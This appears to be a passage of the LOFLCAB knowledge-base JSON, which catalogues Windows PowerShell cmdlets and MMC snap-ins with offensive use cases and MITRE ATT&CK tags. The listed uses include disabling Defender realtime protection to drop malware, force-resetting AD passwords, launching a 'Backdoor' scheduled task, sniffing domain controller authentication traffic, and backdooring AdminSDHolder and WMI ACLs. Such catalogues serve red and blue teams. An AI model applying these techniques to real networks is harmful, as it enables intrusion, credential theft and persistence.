"Type":"Cmdlets","Name":"Restart-Computer","Description":"Restarts the operating system on local and remote computers","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"Restart-Computer -ComputerName W10.ad.bitsadmin.com,W11.ad.bitsadmin.com","Description":"Restart machines","Usecases":["When persistence has been accomplished, a restart will trigger execution of the payload"],"Function":"Sessions","Comments":["PowerShell Module: `Microsoft.PowerShell.Management`"],"MitreAttack":["T1529"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Restart-Computer/"},{
"Type":"Cmdlets","Name":"Search-ADAccount","Description":"Gets Active Directory user, computer, or service accounts","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Search-ADAccount -AccountInactive -TimeSpan 30","Description":"Search for accounts","Usecases":["Accounts that are inactive for at least 30 days"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Search-ADAccount/"},{
"Type":"Cmdlets","Name":"Set-ADAccountControl","Description":"Modifies user account control (UAC) values for an Active Directory account","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Set-ADAccountControl","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-ADAccountControl/"},{
"Type":"Cmdlets","Name":"Set-ADAccountExpiration","Description":"Sets the expiration date for an Active Directory account","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Set-ADAccountExpiration","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-ADAccountExpiration/"},{
"Type":"Cmdlets","Name":"Set-ADAccountPassword","Description":"Modifies the password of an Active Directory account","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"$new = ConvertTo-SecureString 'NewPassword1!' -A -F\nSet-ADAccountPassword -Identity MyAccount -Reset -NewPassword $new\n","Description":"Reset password","Usecases":["Force reset a user's password to obtain access to the account"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":["T1531"]},{"Command":"$old = ConvertTo-SecureString 'OldPassword1!' -A -F\n$new = ConvertTo-SecureString 'NewPassword1!' -A -F\nSet-ADAccountPassword -Identity MyAccount -OldPassword $old -NewPassword $new\n","Description":"Update password","Usecases":["Update a user's password"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":["T1531"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-ADAccountPassword/"},{
"Type":"Cmdlets","Name":"Set-ADGroup","Description":"Modifies an Active Directory group","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Set-ADGroup","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-ADGroup/"},{
"Type":"Cmdlets","Name":"Set-ADObject","Description":"Modifies an Active Directory object","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Set-ADObject","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-ADObject/"},{
"Type":"Cmdlets","Name":"Set-ADServiceAccount","Description":"Modifies an Active Directory managed service account or group managed service account object","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Set-ADServiceAccount","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-ADServiceAccount/"},{
"Type":"Cmdlets","Name":"Set-ADUser","Description":"Modifies an Active Directory user","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Set-ADUser","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-ADUser/"},{
"Type":"Cmdlets","Name":"Set-CimInstance","Description":"Modifies a CIM instance on a CIM server by calling the ModifyInstance method of the CIM class","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Set-CimInstance -Query 'Select * from Win32_Environment where name LIKE \"testvar%\"' -Property @{VariableValue=\"abcd\"}","Description":"Update attribute of CIM instance","Usecases":["Update path variable"],"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `CimCmdlets`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-CimInstance/"},{
"Type":"Cmdlets","Name":"Set-DhcpServerAuditLog","Description":"Sets the Dynamic Host Configuration Protocol (DHCP) server service audit log configuration on the DHCP server service running on the computer","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Set-DhcpServerAuditLog -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DhcpServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-DhcpServerAuditLog/"},{
"Type":"Cmdlets","Name":"Set-MpPreference","Description":"Configures preferences for Windows Defender scans and updates","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Set-MpPreference -CimSession $s -DisableRealtimeMonitoring $true","Description":"Disable realtime monitoring","Usecases":["Disable the realtime protection of Windows Defender to be able to drop malicious binaries"],"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Note this will shown an alert to the user, alternative is to add an excluded folder using [Add-MpPreference](../Add-MpPreference)","PowerShell Module: `Defender`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-MpPreference/"},{
"Type":"Cmdlets","Name":"Set-NetConnectionProfile","Description":"Changes the network category of a connection profile","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Set-NetConnectionProfile -CimSession $s -InterfaceAlias 'Ethernet0' -NetworkCategory Private","Description":"Update connection profile for network adapter","Usecases":["Update connection profile to have a different firewall policy applied"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetConnection`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-NetConnectionProfile/"},{
"Type":"Cmdlets","Name":"Set-NetFirewallProfile","Description":"Configures settings that apply to the per-profile configurations of the Windows Firewall with Advanced Security","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Set-NetFirewallProfile -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `netsecurity`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-NetFirewallProfile/"},{
"Type":"Cmdlets","Name":"Set-NetFirewallRule","Description":"Modifies existing firewall rules","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Set-NetFirewallRule -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `netsecurity`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-NetFirewallRule/"},{
"Type":"Cmdlets","Name":"Set-NetFirewallSetting","Description":"Modifies the global firewall settings of the target computer","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Set-NetFirewallSetting -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `netsecurity`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-NetFirewallSetting/"},{
"Type":"Cmdlets","Name":"Set-NetNat","Description":"Modifies settings for NAT objects","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Set-NetNat -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetNat`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-NetNat/"},{
"Type":"Cmdlets","Name":"Set-NetNatGlobal","Description":"Modifies global settings for NAT instances on a computer","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Set-NetNatGlobal -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetNat`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-NetNatGlobal/"},{
"Type":"Cmdlets","Name":"Set-NetRoute","Description":"Modifies an entry or entries in the IP routing table","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Set-NetRoute -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetTCPIP`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-NetRoute/"},{
"Type":"Cmdlets","Name":"Set-ScheduledTask","Description":"Modifies a scheduled task","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Set-ScheduledTask -CimSession $s","Description":"Update schedule task","Usecases":null,"Function":"Processes","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `ScheduledTasks`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-ScheduledTask/"},{
"Type":"Cmdlets","Name":"Set-WSManInstance","Description":"Modifies the management information that is related to a resource","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"Set-WSManInstance","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["PowerShell Module: `Microsoft.WSMan.Management`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Set-WSManInstance/"},{
"Type":"Cmdlets","Name":"Show-DnsServerCache","Description":"Shows the records in a DNS Server Cache","Updated":"2023-07-01","Toolsets":["CIMSession","RSAT"],"Commands":[{"Command":"Show-DnsServerCache -CimSession $s","Description":"Show DNS server cached DNS entries","Usecases":["Reconnaissance on the network/Internet activities on the domain"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DnsServer`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Show-DnsServerCache/"},{
"Type":"Cmdlets","Name":"Show-EventLog","Description":"Displays the event logs of the local or a remote computer in Event Viewer","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"Show-EventLog -ComputerName W10.ad.bitsadmin.com","Description":"Show Windows event log","Usecases":["Disable certain logs (Right click -> Disable Log)","Identify source IPs from which certain users have logged in to chase after their workstations"],"Function":"Logs","Comments":["Simply launches `mmc.exe eventvwr.msc /COMPUTER:W10.ad.bitsadmin.com`","Equivalent to [eventvwr.msc](../../MMC/eventvwr)"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Show-EventLog/"},{
"Type":"Cmdlets","Name":"Show-NetFirewallRule","Description":"Displays all of the existing IPsec rules and associated objects in a fully expanded view","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Show-NetFirewallRule -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `netsecurity`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Show-NetFirewallRule/"},{
"Type":"Cmdlets","Name":"Start-DscConfiguration","Description":"Applies configuration to nodes","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Start-DscConfiguration -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `PSDesiredStateConfiguration`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Start-DscConfiguration/"},{
"Type":"Cmdlets","Name":"Start-NetEventSession","Description":"Starts event and packet capture for a network event session","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Start-NetEventSession -Name sess -CimSession $s","Description":"TODO","Usecases":["Sniff authentication traffic on a domain controller and locally crack the hashes"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","See all details in [New-NetEventSession](../New-NetEventSession)","PowerShell Module: `NetEventPacketCapture`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Start-NetEventSession/"},{
"Type":"Cmdlets","Name":"Start-ScheduledTask","Description":"Starts one or more instances of a scheduled task","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Start-ScheduledTask -CimSession $s -TaskName Backdoor","Description":"Launch scheduled task","Usecases":["Launch implant"],"Function":"Execute","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `ScheduledTasks`"],"MitreAttack":["T1053.005","T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Start-ScheduledTask/"},{
"Type":"Cmdlets","Name":"Start-VM","Description":"Starts a virtual machine","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Start-VM -Name 'Windows 10 22H2' -CimSession $s","Description":"Start VM","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Hyper-V`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Start-VM/"},{
"Type":"Cmdlets","Name":"Stop-Computer","Description":"Stops (shuts down) local and remote computers","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"Stop-Computer -ComputerName W10.ad.bitsadmin.com,w11.ad.bitsadmin.com -Force","Description":"Shutdown machines","Usecases":["Make machine unavailable"],"Function":"Sessions","Comments":["PowerShell Module: `Microsoft.PowerShell.Management`"],"MitreAttack":["T1529"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Stop-Computer/"},{
"Type":"Cmdlets","Name":"Stop-EtwTraceSession","Description":"Stops the specified ETW session","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Stop-EtwTraceSession -CimSession $s","Description":"TODO","Usecases":null,"Function":"Misc","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `EventTracingManagement`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Stop-EtwTraceSession/"},{
"Type":"Cmdlets","Name":"Stop-NetEventSession","Description":"Stops event and packet capture for a network event session","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Stop-NetEventSession -Name sess -CimSession $s","Description":"Stop packet capture","Usecases":["Sniff authentication traffic on a domain controller and locally crack the hashes"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","See all details in [New-NetEventSession](../New-NetEventSession)","PowerShell Module: `NetEventPacketCapture`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Stop-NetEventSession/"},{
"Type":"Cmdlets","Name":"Test-Connection","Description":"Sends ICMP echo request packets, or pings, to one or more computers.","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"Test-Connection DC1.ad.bitsadmin.com","Description":null,"Usecases":null,"Function":"Network","Comments":["By default uses ICMP, however provides a number of parameters related to authentication"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Test-Connection/"},{
"Type":"Cmdlets","Name":"Test-NetConnection","Description":"Displays diagnostic information for a connection","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"Test-NetConnection","Description":"TODO","Usecases":null,"Function":"Network","Comments":["PowerShell Module: `NetTCPIP`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Test-NetConnection/"},{
"Type":"Cmdlets","Name":"Uninstall-WindowsFeature","Description":"Uninstalls specified Windows Server roles, role services, and features from a computer that is running Windows Server 2012 R2","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Uninstall-WindowsFeature","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["PowerShell Module: `ServerManager`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Uninstall-WindowsFeature/"},{
"Type":"Cmdlets","Name":"Unlock-ADAccount","Description":"Unlocks an Active Directory account","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Unlock-ADAccount","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Unlock-ADAccount/"},{
"Type":"Cmdlets","Name":"Unregister-ScheduledTask","Description":"Unregisters a scheduled task","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Unregister-ScheduledTask -CimSession $s Backdoor -Confirm:$false","Description":"Remove scheduled task","Usecases":["Remove persistence"],"Function":"Execute","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `ScheduledTasks`"],"MitreAttack":["T1053.005","T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Unregister-ScheduledTask/"},{
"Type":"Cmdlets","Name":"Write-EventLog","Description":"Writes an event to an event log.","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"Write-EventLog","Description":"TODO","Usecases":null,"Function":"Logs","Comments":["PowerShell Module: `Microsoft.PowerShell.Management`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Write-EventLog/"},{
"Type":"MMC","Name":"AdRmsAdmin.msc","Description":"Active Directory Rights Management Services","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"AdRmsAdmin.msc","Description":"Active Directory Rights Management Services","Usecases":null,"Function":"Domain","Comments":["Right click -> Add Cluster -> Connect to: Remote computer"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"80/TCP"},{"Port":"443/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/AdRmsAdmin/"},{
"Type":"MMC","Name":"CluAdmin.msc","Description":"Failover Cluster Manager","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"CluAdmin.msc","Description":"Failover Cluster Manager","Usecases":null,"Function":"Manage","Comments":["Right click Failover Cluster Manager -> Connect to Cluster -> Browse"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"389/UDP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/CluAdmin/"},{
"Type":"MMC","Name":"DevModeRunAsUserConfig.msc","Description":"Group policy settings: Start Menu and Taskbar","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"gpedit.msc","Description":"Group policy settings: Start Menu and Taskbar","Usecases":null,"Function":"Domain","Comments":["For remote use, see [gpedit.msc](../gpedit)","Equivalent to gpedit.msc -> User Configuration -> Administrative Templates -> Start Menu and Taskbar"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/DevModeRunAsUserConfig/"},{
"Type":"MMC","Name":"Microsoft.IdentityServer.msc","Description":"AD FS Management","Updated":"2024-12-13","Toolsets":["GUI","Server"],"Commands":[{"Command":"%SystemRoot%\\ADFS\\Microsoft.IdentityServer.msc","Description":"AD FS Management","Usecases":null,"Function":"Manage","Comments":["Seems not possible to use this MMC remotely. Use the ADFS PowerShell module instead"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/Microsoft.IdentityServer/"},{
"Type":"MMC","Name":"RAMgmtUI.exe","Description":"Remote Access Management","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"RAMgmtUI.exe -computerName DC1.ad.bitsadmin.com","Description":"Remote Access Management","Usecases":null,"Function":"Manage","Comments":["Manage DirectAccess and VPN"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"},{"Port":"135/TCP"},{"Port":"5985/TCP"},{"Port":"389/UDP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/RAMgmtUI/"},{
"Type":"MMC","Name":"SQLServerManager15.msc","Description":"SQL Server 2019 Configuration Manager","Updated":"2023-07-01","Toolsets":["Extra","GUI"],"Commands":[{"Command":"SQLServerManager15.msc /computer:SQL1.ad.bitsadmin.com","Description":"SQL Server 2019 Configuration Manager","Usecases":null,"Function":"Manage","Comments":["Install \"Client Tools Connectivity\" in the SQL Server Express or Developer installation wizard"],"MitreAttack":null}],"Resources":["https://www.microsoft.com/en-us/evalcenter/download-sql-server-2019"],"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/SQLServerManager15/"},{
"Type":"MMC","Name":"SQLServerManager16.msc","Description":"SQL Server 2022 Configuration Manager","Updated":"2023-07-01","Toolsets":["Extra","GUI"],"Commands":[{"Command":"SQLServerManager16.msc /computer:SQL1.ad.bitsadmin.com","Description":"SQL Server 2022 Configuration Manager","Usecases":null,"Function":"Manage","Comments":["Install \"Integration Services\" in the SQL Server Express or Developer installation wizard"],"MitreAttack":null}],"Resources":["https://www.microsoft.com/en-us/evalcenter/download-sql-server-2022"],"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/SQLServerManager16/"},{
"Type":"MMC","Name":"WF.msc","Description":"Windows Defender Firewall with Advanced Security","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"mmc.exe","Description":"Windows Defender Firewall with Advanced Security","Usecases":["Add an exception to the filewall for a backdoor executable/port","Disable the Windows Defender Firewall"],"Function":"Manage","Comments":["mmc.exe -> File -> Add/Remove Snap-In -> Windows Defender Firewall with Advanced Security -> Add -> Another computer: `W10.ad.bitsadmin.com` -> Finish -> OK"],"MitreAttack":["T1562.004"]}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/WF/"},{
"Type":"MMC","Name":"WdsMgmt.msc","Description":"Windows Deployment Services","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"WdsMgmt.msc","Description":"Windows Deployment Services","Usecases":null,"Function":"Manage","Comments":["Right click on Servers -> Add Server -> Another computer: `DC1.ad.bitsadmin.com` -> OK"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/WdsMgmt/"},{
"Type":"MMC","Name":"WmiMgmt.msc","Description":"WMI Control","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"WmiMgmt.msc","Description":"WMI Control","Usecases":["Add WMI backdoor by weakening the security of the root namespace"],"Function":"Manage","Comments":["Right click WMI Control -> Connect to another computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":[{"Port":"135/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/WmiMgmt/"},{
"Type":"MMC","Name":"adsiedit.msc","Description":"ADSI Edit","Updated":"2023-07-01","Toolsets":["GUI","RSAT"],"Commands":[{"Command":"adsiedit.msc","Description":"ADSI Edit","Usecases":["Backdoor ACLs of AdminSDHolder container","Weaken security ACLs of OUs","Reset passwords","View sensitive information like LAPS passwords in the attribute editor"],"Function":"Manage","Comments":["When it is launched from a `runas /netonly` prompt, it automatically connects to the right instance. Alternatively, right click the root node -> Connect to -> select Default (Domain or server that you logged in to)","Port 636/TCP is used in case SSL-based Encryption is selected"],"MitreAttack":null}],"Resources":null,"Detections":[{"Port":"389/UDP"},{"Port":"389/TCP"},{"Port":"636/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/MMC/adsiedit/"},{
